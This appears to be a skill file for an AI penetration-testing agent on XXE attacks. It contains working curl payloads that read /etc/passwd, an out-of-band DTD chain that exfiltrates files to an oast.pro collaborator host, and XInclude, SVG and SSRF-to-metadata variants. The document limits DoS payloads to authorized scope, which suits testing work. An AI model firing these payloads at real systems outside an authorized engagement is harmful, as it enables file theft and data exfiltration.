---
name: web-xxe
description: Use when an endpoint parses XML/SOAP/SVG/DOCX/XLSX — detect XXE, read files, OOB-exfil blind XXE; billion-laughs only if DoS is authorized. Class xxe.
---

# XML external entity (XXE) & XML attacks

Triggered anywhere XML is parsed. Prove with a benign local-file read or an OOB callback. **Never** send a billion-laughs/entity-expansion payload unless the engagement explicitly authorizes DoS — record an `approval` blocker instead. Class `xxe`, CWE-611.

Per candidate: `record kind=hypothesis ... class=xxe outcome=testing`.

## 1. Find XML sinks
- `Content-Type: application/xml`, `text/xml`, `application/soap+xml`.
- File formats that are XML underneath: **SVG**, **DOCX/XLSX/PPTX** (zipped XML), `.xml` config import, RSS/Atom, SAML, SOAP APIs, WSDL.
- Try flipping a JSON endpoint to XML: set `Content-Type: application/xml` and send an XML body — some parsers accept both.

## 2. Classic in-band file read
```bash
curl -s https://TARGET/api -H 'Content-Type: application/xml' --data-binary @- <<'XML'
<?xml version="1.0"?>
<!DOCTYPE r [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<root><name>&xxe;</name></root>
XML
```
Confirm: response echoes `/etc/passwd` contents (`root:x:0:0`). Windows: `file:///c:/windows/win.ini`. Directory listing: `file:///etc/`.

## 3. Blind / OOB XXE (no reflection)
Host a DTD on your collaborator, then trigger it:
```bash
# evil.dtd on OOB host:
# <!ENTITY % f SYSTEM "file:///etc/hostname">
# <!ENTITY % all "<!ENTITY exfil SYSTEM 'http://OOB_ID.oast.pro/?x=%f;'>"> %all;
curl -s https://TARGET/api -H 'Content-Type: application/xml' --data-binary @- <<'XML'
<?xml version="1.0"?>
<!DOCTYPE r [ <!ENTITY % dtd SYSTEM "http://OOB_ID.oast.pro/evil.dtd"> %dtd; ]>
<r>&exfil;</r>
XML
```
A callback carrying the file contents = confirmed blind XXE. A DNS/HTTP hit alone (no data) still confirms external-entity resolution.

## 4. Variants
- **SVG upload → XXE / file read:** embed the DOCTYPE in an uploaded `.svg` the server rasterizes.
- **XInclude** (when you control only part of the doc, no DOCTYPE): `<x xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></x>`.
- **SSRF via XXE:** `SYSTEM "http://169.254.169.254/..."` — pivots to the web-ssrf playbook (metadata).
- **Parameter/error-based** exfil when OOB egress is blocked (leak file via a parse error message).

## 5. Billion laughs / entity expansion (DoS — authorization required)
Nested-entity expansion crashes the parser. This is destructive; only run it if DoS is authorized in scope. Otherwise: `record kind=blocker blockerType=approval question="Approve XML entity-expansion DoS PoC?" priority=low` and instead *note* that expansion limits appear absent as a lower-confidence observation.

## Confirm vs false positive
- A 500 on malformed XML is not XXE — it may just be a rejecting parser. Require actual file contents in-band, or an OOB callback that resolves the external entity.
- If entities are silently ignored (secure parser / `FEATURE_SECURE_PROCESSING`), record the hypothesis as `refuted`.

## Wire into the loop
```
record kind=hypothesis statement="/api XML parser resolves external entities" target=e8 class=xxe approach="file:///etc/passwd entity, check reflection" outcome=confirmed evidence=evidence/xxe-passwd.txt
record kind=finding title="XXE file read via SOAP endpoint" severity=high target=e8 class=xxe cwe=CWE-611 status=confirmed hypothesisId=y11 repro="POST XML with SYSTEM file:///etc/passwd entity" evidence=["evidence/xxe-passwd.txt"]
```
Severity: file read of secrets / SSRF-to-metadata via XXE = high/critical; OOB resolution with limited reach = medium; DoS-only = per engagement.
